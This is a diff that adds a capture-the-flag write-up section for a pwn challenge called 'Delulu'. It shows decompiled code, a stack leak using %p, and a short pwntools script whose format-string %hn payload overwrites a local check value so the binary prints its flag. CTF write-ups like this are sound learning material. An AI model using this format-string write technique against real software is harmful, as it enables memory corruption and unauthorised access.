@@ -9,6 +9,109 @@ cover: cover.jpg
 categories: [Capture The Flag]
 ---
 
+## Pwn
+### Delulu
+
+Reversing the binary it set `var_48` to `0x1337babe`. It then checks if it is == `0x1337beef` an calls delulu
+
+```c
+0000144a  int32_t main(int32_t argc, char** argv, char** envp)
+
+0000144a  {
+00001456      void* fsbase;
+00001456      int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
+00001465      int64_t var_48 = 0x1337babe;
+00001471      int64_t* ptr = &var_48;
+00001475      int64_t input;
+00001475      __builtin_memset(&input, 0, 0x20);
+000014a6      read(0, &input, 0x1f);
+000014ba      printf("\n[!] Checking.. ");
+000014cb      printf(&input);
+000014cb      
+000014da      if (var_48 == 0x1337beef)
+000014f2          delulu();
+000014da      else
+000014e6          error("ALERT ALERT ALERT ALERT\n");
+000014e6      
+00001500      *(uint64_t*)((char*)fsbase + 0x28);
+00001500      
+00001509      if (rax == *(uint64_t*)((char*)fsbase + 0x28))
+00001511          return 0;
+00001511      
+0000150b      __stack_chk_fail();
+0000150b      /* no return */
+0000144a  }
+```
+
+delulu function opens the flag.txt file
+
+```c
+00001332  int64_t delulu()
+
+00001332  {
+0000133e      void* fsbase;
+0000133e      int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
+00001361      int32_t fd = open("./flag.txt", 0);
+00001361      
+0000136d      if (fd < 0)
+0000136d      {
+00001379          perror("\nError opening flag.txt, please…");
+00001383          exit(1);
+00001383          /* no return */
+0000136d      }
+0000136d      
+00001397      printf("You managed to deceive the robot…");
+000013c7      char buf;
+000013c7      
+000013c7      while (read(fd, &buf, 1) > 0)
+000013b1          fputc(((int32_t)buf), __TMC_END__);
+000013b1      
+000013d6      close(fd);
+000013d6      
+000013e9      if (rax == *(uint64_t*)((char*)fsbase + 0x28))
+000013f1          return (rax - *(uint64_t*)((char*)fsbase + 0x28));
+000013f1      
+000013eb      __stack_chk_fail();
+000013eb      /* no return */
+00001332  }
+```
+
+The binary has a format string in the `printf()`. We need to leak the offset of the pointer `int64_t* ptr = &var_48;`. we use `%p` format specifier to print the pointers addresses.
+
+```bash
+>> %p %p %p %p %p %p %p %p %p %p
+
+[!] Checking.. 0x7ffc5a9c9bd0 (nil) 0x72d323714887 0x10 0x7fffffff 0x1337babe 0x7ffc5a9cbcf0 0x7025207025207025 0x2520702520702520 0x2070252070252070
+
+[-] ALERT ALERT ALERT ALERT
+```
+
+The address is `0x7ffc5a9cbcf0` since it is below `0x1337babe`. The offset is `7`. The following are the format specifiers for memory writes.
+
+```bash
+%n: Writes 4 bytes to an int*.
+%hn: Writes 2 bytes to a short*.
+%hhn: Writes 1 byte to a char*.
+```
+
+we use the following code to run the exploit
+
+```python
+from pwn import *
+
+filename = "./delulu"
+
+elf = ELF(filename)
+p = process(filename)
+
+offset = 7
+value = 0xbeef
+
+p.sendlineafter(b'>>', f"%{value}c%{offset}$hn")
+
+p.interactive()
+```
+
 ## Crypto
 ### Makeshift
 
